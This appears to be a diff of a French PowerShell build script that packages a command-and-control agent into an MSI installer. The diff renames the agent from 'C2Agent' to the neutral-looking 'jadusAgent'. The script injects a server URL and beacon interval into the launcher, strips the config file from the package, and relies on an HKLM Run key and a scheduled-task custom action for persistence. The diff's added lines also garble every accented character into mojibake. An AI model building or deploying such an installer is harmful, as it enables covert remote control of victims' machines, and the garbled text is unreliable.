@@ -1,20 +1,20 @@
-#Requires -Version 5.0
+﻿#Requires -Version 5.0
 
 <#
 .SYNOPSIS
-    Script de compilation du MSI pour l'agent C2
+    Script de compilation du MSI pour l'agent jadus
 
 .DESCRIPTION
     Ce script :
-    1. Vérifie que WiX Toolset est installé
-    2. Compile le fichier C2Agent.wxs en C2Agent.wixobj
-    3. Linke les fichiers pour créer C2Agent.msi
+    1. VÃ©rifie que WiX Toolset est installÃ©
+    2. Compile le fichier jadusAgent.wxs en jadusAgent.wixobj
+    3. Linke les fichiers pour crÃ©er jadusAgent.msi
 
 .PARAMETER WixPath
-    Chemin vers le répertoire d'installation de WiX (auto-détection si non spécifié)
+    Chemin vers le rÃ©pertoire d'installation de WiX (auto-dÃ©tection si non spÃ©cifiÃ©)
 
 .PARAMETER OutputDir
-    Répertoire de sortie pour le MSI (par défaut: répertoire courant)
+    RÃ©pertoire de sortie pour le MSI (par dÃ©faut: rÃ©pertoire courant)
 
 .EXAMPLE
     .\build-msi.ps1
@@ -49,13 +49,13 @@ function Write-Log {
 
 Write-Host ""
 Write-Host "========================================================" -ForegroundColor Cyan
-Write-Host "        WiX MSI Builder - C2 Agent" -ForegroundColor Cyan
+Write-Host "        WiX MSI Builder - jadus Agent" -ForegroundColor Cyan
 Write-Host "========================================================" -ForegroundColor Cyan
 Write-Host ""
 
-# Détecter le compilateur MSI wixl (paquet wixl / msitools) — compile sur Linux.
-# La tâche planifiée n'est PAS créée par une custom action (wixl ne les exécute
-# pas) : le MSI pose une entrée HKLM\...\Run qui lance bootstrap.ps1 au 1er login.
+# DÃ©tecter le compilateur MSI wixl (paquet wixl / msitools) â€” compile sur Linux.
+# La tÃ¢che planifiÃ©e n'est PAS crÃ©Ã©e par une custom action (wixl ne les exÃ©cute
+# pas) : le MSI pose une entrÃ©e HKLM\...\Run qui lance bootstrap.ps1 au 1er login.
 Write-Log "Recherche du compilateur MSI (wixl)..." "INFO"
 
 $wixlCmd = Get-Command "wixl" -ErrorAction SilentlyContinue
@@ -64,39 +64,39 @@ if (-not $wixlCmd) {
     exit 1
 }
 $wixlPath = $wixlCmd.Source
-Write-Log "wixl trouvé: $wixlPath" "SUCCESS"
+Write-Log "wixl trouvÃ©: $wixlPath" "SUCCESS"
 
-# Vérifier que les fichiers source existent
-$wxsFile = Join-Path -Path $PSScriptRoot -ChildPath "C2Agent.wxs"
+# VÃ©rifier que les fichiers source existent
+$wxsFile = Join-Path -Path $PSScriptRoot -ChildPath "jadusAgent.wxs"
 $configFile = Join-Path -Path $PSScriptRoot -ChildPath "config.json"
 $launcherFile = Join-Path -Path $PSScriptRoot -ChildPath "launcher.ps1"
 $agentFile = Join-Path -Path $PSScriptRoot -ChildPath "agent_active.ps1"
 
-Write-Log "Vérification des fichiers source..." "INFO"
+Write-Log "VÃ©rification des fichiers source..." "INFO"
 
 if (-not (Test-Path -Path $wxsFile)) {
-    Write-Log "Fichier WiX non trouvé: $wxsFile" "ERROR"
+    Write-Log "Fichier WiX non trouvÃ©: $wxsFile" "ERROR"
     exit 1
 }
 
 if (-not (Test-Path -Path $configFile)) {
-    Write-Log "Fichier config non trouvé: $configFile" "ERROR"
+    Write-Log "Fichier config non trouvÃ©: $configFile" "ERROR"
     exit 1
 }
 
 if (-not (Test-Path -Path $launcherFile)) {
-    Write-Log "Fichier launcher non trouvé: $launcherFile" "ERROR"
+    Write-Log "Fichier launcher non trouvÃ©: $launcherFile" "ERROR"
     exit 1
 }
 
 if (-not (Test-Path -Path $agentFile)) {
-    Write-Log "Fichier agent_active.ps1 non trouvé: $agentFile" "ERROR"
+    Write-Log "Fichier agent_active.ps1 non trouvÃ©: $agentFile" "ERROR"
     exit 1
 }
 
-Write-Log "Fichiers source vérifiés avec succès" "SUCCESS"
+Write-Log "Fichiers source vÃ©rifiÃ©s avec succÃ¨s" "SUCCESS"
 
-# wixl est un binaire unique : pas de candle/light séparés à valider.
+# wixl est un binaire unique : pas de candle/light sÃ©parÃ©s Ã  valider.
 
 # ===== INJECTION DE CONFIGURATION =====
 
@@ -109,7 +109,7 @@ try {
     $beaconInterval = $config.agent.beaconInterval
     $logFile = $config.agent.logFile
     
-    Write-Log "✅ Configuration chargée:" "SUCCESS"
+    Write-Log "âœ… Configuration chargÃ©e:" "SUCCESS"
     Write-Log "   Server URL: $serverUrl" "INFO"
     Write-Log "   Beacon Interval: $beaconInterval secondes" "INFO"
     Write-Log "   Log File: $logFile" "INFO"
@@ -119,39 +119,39 @@ catch {
     exit 1
 }
 
-# Créer launcher.ps1 injecté avec les paramètres
+# CrÃ©er launcher.ps1 injectÃ© avec les paramÃ¨tres
 Write-Log "" "INFO"
-Write-Log "Injection des paramètres dans launcher.ps1..." "INFO"
+Write-Log "Injection des paramÃ¨tres dans launcher.ps1..." "INFO"
 
 $launcherContent = Get-Content -Path $launcherFile -Raw
 
-# Remplacer les valeurs par défaut
+# Remplacer les valeurs par dÃ©faut
 $injectedLauncher = $launcherContent `
     -replace 'ConfigPath = "\$PSScriptRoot\\config\.json"', "ConfigPath = `"INJECTED`"" `
     -replace 'Expand-EnvironmentVariables \$config\.agent\.serverUrl', "`"$serverUrl`"" `
     -replace 'Expand-EnvironmentVariables \$config\.agent\.beaconInterval', "$beaconInterval" `
     -replace 'Expand-EnvironmentVariables \$config\.agent\.logFile', "`"$logFile`""
 
-# Également remplacer directement les variables utilisées
+# Ã‰galement remplacer directement les variables utilisÃ©es
 $injectedLauncher = $injectedLauncher `
     -replace '\$serverUrl = \$config\.agent\.serverUrl', "`$serverUrl = `"$serverUrl`"" `
     -replace '\$beaconInterval = \$config\.agent\.beaconInterval', "`$beaconInterval = $beaconInterval" `
     -replace '\$logFilePath = Expand-EnvironmentVariables \$config\.agent\.logFile', "`$logFilePath = `"$([System.Environment]::ExpandEnvironmentVariables($logFile))`""
 
-# Sauvegarder le launcher injecté temporairement
+# Sauvegarder le launcher injectÃ© temporairement
 $injectedLauncherPath = Join-Path -Path $PSScriptRoot -ChildPath "launcher.ps1.injected"
 Set-Content -Path $injectedLauncherPath -Value $injectedLauncher
 
-Write-Log "✅ launcher.ps1 injecté créé" "SUCCESS"
+Write-Log "âœ… launcher.ps1 injectÃ© crÃ©Ã©" "SUCCESS"
 
-# Modifier temporairement C2Agent.wxs pour pointer vers le launcher injecté et enlever config.json
+# Modifier temporairement jadusAgent.wxs pour pointer vers le launcher injectÃ© et enlever config.json
 Write-Log "" "INFO"
-Write-Log "Modification temporaire de C2Agent.wxs..." "INFO"
+Write-Log "Modification temporaire de jadusAgent.wxs..." "INFO"
 
 $wxsContent = Get-Content -Path $wxsFile -Raw
 $wxsBackup = $wxsContent
 
-# Remplacer la référence launcher.ps1 par launcher.ps1.injected
+# Remplacer la rÃ©fÃ©rence launcher.ps1 par launcher.ps1.injected
 $wxsModified = $wxsContent `
     -replace 'Source="launcher\.ps1"', 'Source="launcher.ps1.injected"'
 
@@ -159,23 +159,23 @@ $wxsModified = $wxsContent `
 $wxsModified = $wxsModified `
     -replace '(?s)<!-- Fichier de configuration -->.*?</Component>', '<!-- ConfigFile removed during build -->'
 
-# Enlever la référence au ConfigFile dans Feature
+# Enlever la rÃ©fÃ©rence au ConfigFile dans Feature
 $wxsModified = $wxsModified `
     -replace '<ComponentRef Id="ConfigFile" />', '<!-- ConfigFile reference removed -->'
 
 # NB : la CustomAction (type exe) et l'InstallExecuteSequence sont conservees.
 # wixl ne supportait pas l'ancienne CustomAction VBScript ; elle a ete remplacee
-# dans C2Agent.wxs par une CustomAction exe qui lance register-task.ps1.
+# dans jadusAgent.wxs par une CustomAction exe qui lance register-task.ps1.
 
 Set-Content -Path $wxsFile -Value $wxsModified
 
-Write-Log "✅ C2Agent.wxs modifié temporairement" "SUCCESS"
+Write-Log "âœ… jadusAgent.wxs modifiÃ© temporairement" "SUCCESS"
 
-# Créer le répertoire de sortie s'il n'existe pas
-$wixobjFile = Join-Path -Path $OutputDir -ChildPath "C2Agent.wixobj"
-$msiFile = Join-Path -Path $OutputDir -ChildPath "C2Agent.msi"
+# CrÃ©er le rÃ©pertoire de sortie s'il n'existe pas
+$wixobjFile = Join-Path -Path $OutputDir -ChildPath "jadusAgent.wixobj"
+$msiFile = Join-Path -Path $OutputDir -ChildPath "jadusAgent.msi"
 
-# Compilation MSI avec wixl (une seule étape : compilation + liaison)
+# Compilation MSI avec wixl (une seule Ã©tape : compilation + liaison)
 Write-Log "" "INFO"
 Write-Log "Compilation du MSI avec wixl..." "INFO"
 Write-Log "Source: $wxsFile" "INFO"
@@ -193,7 +193,7 @@ try {
         exit 1
     }
 
-    Write-Log "Compilation MSI réussie" "SUCCESS"
+    Write-Log "Compilation MSI rÃ©ussie" "SUCCESS"
 }
 catch {
     Write-Log "Erreur lors de la compilation wixl: $_" "ERROR"
@@ -202,38 +202,38 @@ catch {
     exit 1
 }
 
-# Vérifier que le MSI a été créé
+# VÃ©rifier que le MSI a Ã©tÃ© crÃ©Ã©
 if (Test-Path -Path $msiFile) {
     $fileSize = (Get-Item -Path $msiFile).Length / 1MB
     Write-Log "" "INFO"
-    Write-Log "✅ MSI créé avec succès!" "SUCCESS"
+    Write-Log "âœ… MSI crÃ©Ã© avec succÃ¨s!" "SUCCESS"
     Write-Log "Fichier: $msiFile" "INFO"
     Write-Log "Taille: $($fileSize.ToString('F2')) MB" "INFO"
     Write-Log "" "INFO"
     
-    # Nettoyer les fichiers intermédiaires
+    # Nettoyer les fichiers intermÃ©diaires
     Write-Log "Nettoyage des fichiers temporaires..." "INFO"
     
     if (Test-Path -Path $wixobjFile) {
         Remove-Item -Path $wixobjFile -Force
-        Write-Log "Fichier supprimé: $wixobjFile" "DEBUG"
+        Write-Log "Fichier supprimÃ©: $wixobjFile" "DEBUG"
     }
     
     if (Test-Path -Path $injectedLauncherPath) {
         Remove-Item -Path $injectedLauncherPath -Force
-        Write-Log "Fichier supprimé: $injectedLauncherPath" "DEBUG"
+        Write-Log "Fichier supprimÃ©: $injectedLauncherPath" "DEBUG"
     }
     
-    # Restaurer C2Agent.wxs
+    # Restaurer jadusAgent.wxs
     Set-Content -Path $wxsFile -Value $wxsBackup
-    Write-Log "C2Agent.wxs restauré à son état original" "DEBUG"
+    Write-Log "jadusAgent.wxs restaurÃ© Ã  son Ã©tat original" "DEBUG"
     
-    Write-Log "✅ Nettoyage terminé" "SUCCESS"
+    Write-Log "âœ… Nettoyage terminÃ©" "SUCCESS"
 }
 else {
-    Write-Log "Erreur: Le fichier MSI n'a pas été créé" "ERROR"
+    Write-Log "Erreur: Le fichier MSI n'a pas Ã©tÃ© crÃ©Ã©" "ERROR"
     
-    # Nettoyer même en cas d'erreur
+    # Nettoyer mÃªme en cas d'erreur
     if (Test-Path -Path $injectedLauncherPath) {
         Remove-Item -Path $injectedLauncherPath -Force
     }
@@ -241,3 +241,4 @@ else {
     
     exit 1
 }
+
